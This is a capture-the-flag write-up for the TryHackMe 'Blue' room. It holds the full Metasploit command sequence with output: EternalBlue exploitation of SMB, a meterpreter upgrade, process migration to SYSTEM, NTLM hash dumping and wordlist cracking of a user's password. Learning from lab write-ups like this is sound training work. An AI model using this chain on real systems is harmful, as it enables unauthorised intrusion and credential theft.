# TryHackMe Blue test

Here is how I solved the Blue test on [TryHackMe](https://tryhackme.com/room/blue), where your goal is to hack a Windows machine, find the passwords for the admins and get the 3 flags hidden in the system.

## Testing ports and vulnerabilities

Initial scan done on `scans/initial.nmap`.
`$ nmap -sC -sV -oN initial.nmap 10.10.60.209`

*Complete scan done with vulscan on `scans/vulscan.nmap`.
`$ nmap -sC -sV --script=vulscan/vulscan.nse -oN vulscan.nmap 10.10.60.209`

*Found vulnerability ms12-020 on port 3389 on `scans/ms12-020.nmap`.
`$nmap -sV --script=rdp-vuln-ms12-020 -oN ms12-020.nmap -p 3389 10.10.60.209`

*Found vulnerability ms17-010 on port 445 on `scans/smb-vuln`, which will be used on this test.
`$nmap -sV --script smb-vuln* -oN smb-vuln.nmap -p 445 10.10.60.209`

## Abusing vulnerabilities
Found metasploit exploits on [SMB Penetration Testing (Port 445)](https://www.hackingarticles.in/smb-penetration-testing-port-445/)

Use the exploit to create a session with the machine
```sh
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.60.209
rhost => 10.10.60.209
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
After session created, pressed ctrl+z to minimize the session and converted the shell to meterpreter shell with:
```sh
sf5 exploit(multi/samba/usermap_script) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > set session 2
session => 2
msf5 post(multi/manage/shell_to_meterpreter) > exploit
```
Select the new session created to use.
`msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 3`

Check the system info.
```sh
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```
 
Open a shell and check if we have the permissions.
```sh
meterpreter > shell
Process 768 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Find a running process running on the `NT AUTHORITY\SYSTEM` user and migrate to it.
```sh
meterpreter > ps
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 1292  1284  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe

...

meterpreter > migrate 1292
[*] Migrating from 2568 to 1292...
[*] Migration completed successfully.
```

Find the users on the machine and their passwords.
```sh
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
``` 

Use `hashdump` to dump the hashes.
```sh
msf5 exploit(multi/manage/shell_to_meterpreter) > use post/windows/gather/hashdump
msf5 post(windows/gather/hashdump) > set SESSION 4
SESSION => 4
msf5 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

Jon:"Nah boi, I ain't sharing nutting with you"

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


[*] Post module execution completed
```

Check the credentials on the local database
```sh
msf5 post(windows/gather/hashdump) > creds
Credentials
===========

host          origin        service        public         private                                                            realm  private_type  JtR Format
----          ------        -------        ------         -------                                                            -----  ------------  ----------
10.10.60.209  10.10.60.209  445/tcp (smb)  administrator  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
10.10.60.209  10.10.60.209  445/tcp (smb)  guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
10.10.60.209  10.10.60.209  445/tcp (smb)  jon            aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d         NTLM hash     nt,lm
```
Use John the Reaper to crack the passwords with the rockyou.txt wordlist.
```sh
msf5 post(windows/gather/hashdump) > useauxiliary/analyze/crack_windows
msf5 auxiliary(analyze/crack_windows) > set CUSTOM_WORDLIST /opt/pwdlist/rockyou.txt
CUSTOM_WORDLIST => /opt/pwdlist/rockyou.txt
msf5 auxiliary(analyze/crack_windows) > run
...
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------
 3      nt         jon       alqfna22          Single

[*] Auxiliary module execution completed
```

## Finding the flags

As easy as it sounds, the flags are 3 text files that we need to read. To this I just run a simple search and `cat` the files to read it`s content.

```sh
meterpreter > search -f flag*.txt
```